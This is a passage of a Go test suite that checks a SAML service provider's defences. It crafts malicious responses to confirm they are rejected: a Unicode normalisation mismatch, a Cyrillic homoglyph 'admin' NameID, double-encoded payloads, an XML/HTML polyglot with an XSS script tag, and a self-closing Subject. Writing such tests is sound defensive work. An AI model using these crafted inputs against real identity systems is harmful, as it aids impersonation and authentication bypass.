	_, err := sp.RetrieveAssertionInfo(context.Background(), encodeResponse(signed))
	// Whitespace-only audience "   " should NOT match "https://sp.example.com"
	require.Error(t, err, "Whitespace-only Audience should cause audience mismatch")
	t.Logf("Correctly rejected whitespace-only Audience: %v", err)
}

// ---------------------------------------------------------------------------
// Unicode Tests (49-50)
// ---------------------------------------------------------------------------

func TestSecurityXML_UnicodeNormalization_IssuerNFCvsNFD(t *testing.T) {
	// Test 49: Unicode normalization attack (NFC vs NFD) on Issuer.
	// The character e-acute can be represented as:
	//   NFC: U+00E9 (single codepoint)
	//   NFD: U+0065 U+0301 (e + combining acute accent)
	// If the IdP sends NFC but the SP checks against NFD (or vice versa),
	// the comparison would fail.
	sp, _ := securityTestSP(t)

	// Craft issuer with NFD form of e-acute (e + combining accent)
	nfdIssuer := "http://www.okta.com/exk5zt0r12Edi4rD20h7" // normal ASCII
	nfcChar := "\u00e9"                                     // e-acute NFC
	nfdChar := "e\u0301"                                    // e + combining accent NFD

	require.True(t, utf8.ValidString(nfcChar))
	require.True(t, utf8.ValidString(nfdChar))
	require.NotEqual(t, nfcChar, nfdChar,
		"NFC and NFD representations should differ at byte level")

	// Use ASCII issuer for the test (it will fail signature anyway)
	_ = nfdIssuer
	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer>caf%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>user@example.com</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), nfdChar,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Issuer with Unicode normalization mismatch should fail validation")
	t.Logf("Unicode normalization correctly handled: %v", err)
}

func TestSecurityXML_HomoglyphAttack_CyrillicInNameID(t *testing.T) {
	// Test 50: Homoglyph attack (Cyrillic chars) on NameID.
	// Cyrillic 'a' (U+0430) looks like Latin 'a' but is a different codepoint.
	sp, _ := securityTestSP(t)

	cyrillicA := "\u0430" // Cyrillic small letter a
	homoglyphNameID := cyrillicA + "dmin@example.com"

	resp := samlResponseTemplate(sp, homoglyphNameID)

	_, el, err := parseResponse([]byte(resp), 0)
	require.NoError(t, err)

	decodedResponse := &types.Response{}
	err = xmlUnmarshalElement(el, decodedResponse)
	require.NoError(t, err)

	if len(decodedResponse.Assertions) > 0 {
		nameID := decodedResponse.Assertions[0].Subject.NameID.Value
		// The Cyrillic 'a' should be preserved as-is; it is NOT equivalent to Latin 'a'
		require.NotEqual(t, "admin@example.com", nameID,
			"Homoglyph NameID should not equal the Latin equivalent")
		require.Equal(t, homoglyphNameID, nameID,
			"NameID should preserve the exact Unicode codepoints")
		t.Logf("Homoglyph NameID correctly preserved: %q (bytes: %x)", nameID, []byte(nameID))
	}
}

// ---------------------------------------------------------------------------
// Double Encoding / Polyglot Tests (51-55)
// ---------------------------------------------------------------------------

func TestSecurityXML_DoubleURLEncoding_RedirectBinding(t *testing.T) {
	// Test 51: Double URL-encoding in redirect binding.
	// If the SP decodes URL encoding twice, an attacker could smuggle content.
	sp, _ := securityTestSP(t)
	sp.InsecureSkipSignatureValidation = true

	xmlMsg := `<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`

	// Normal deflate+encode
	encoded := deflateAndEncode(t, xmlMsg)
	// Double URL-encode the result
	doubleEncoded := url.QueryEscape(url.QueryEscape(encoded))

	// This should fail because base64 decode will fail on the URL-encoded string
	_, err := sp.ValidateEncodedResponse(context.Background(), doubleEncoded)
	require.Error(t, err, "Double URL-encoded response should be rejected")
	t.Logf("Correctly rejected double URL-encoding: %v", err)
}

func TestSecurityXML_DoubleBase64Encoding(t *testing.T) {
	// Test 52: Double Base64 encoding.
	sp, _ := securityTestSP(t)

	validResp := makeValidResponse(sp)
	singleEncoded := encodeResponse(validResp)
	// Encode the base64 string again
	doubleEncoded := base64.StdEncoding.EncodeToString([]byte(singleEncoded))

	_, err := sp.ValidateEncodedResponse(context.Background(), doubleEncoded)
	require.Error(t, err, "Double base64-encoded response should be rejected")
	t.Logf("Correctly rejected double base64 encoding: %v", err)
}

func TestSecurityXML_Polyglot_HTMLScriptTags(t *testing.T) {
	// Test 53: Polyglot XML/HTML with script tags.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <script xmlns="http://www.w3.org/1999/xhtml">alert('XSS')</script>
</saml2p:Response>`, sp.ACSURL, sp.IDPEntityID)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	// Should fail due to missing assertions/signature, not XSS
	require.Error(t, err, "Polyglot XML/HTML should be rejected")
	t.Logf("Correctly rejected polyglot XML/HTML: %v", err)
}

func TestSecurityXML_MalformedSelfClosingTags(t *testing.T) {
	// Test 54: Malformed self-closing tags on parent elements (<Subject/>).
	// A self-closing <Subject/> would mean no child elements, potentially
	// bypassing checks that look for NameID inside Subject.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject/>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Self-closing Subject should cause validation failure (missing NameID)")
	t.Logf("Correctly rejected self-closing Subject: %v", err)
}

func TestSecurityXML_EntityReferenceInTagName(t *testing.T) {
	// Test 55: Entity reference in tag name position.
	// Entity references cannot appear in tag names in well-formed XML.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY tagname "Response">]>
<&tagname; xmlns="urn:oasis:names:tc:SAML:2.0:protocol"/>`

	_, _, err := parseResponse([]byte(maliciousXML), 0)
	require.Error(t, err, "Entity reference in tag name position should be rejected")
	t.Logf("Correctly rejected entity reference in tag name: %v", err)
}

// ---------------------------------------------------------------------------
// Ensure all tests are independent and use no unused imports
// ---------------------------------------------------------------------------

// Compile-time assertions that the imports are used.
var (
	_ = base64.StdEncoding
	_ = context.Background
	_ = xml.Unmarshal
	_ = fmt.Sprintf
	_ = strings.Repeat
	_ = time.RFC3339
	_ = bytes.NewReader
	_ = flate.DefaultCompression
	_ = url.QueryEscape
	_ = utf8.ValidString
	_ = (*types.Response)(nil)
	_ = require.Error
)
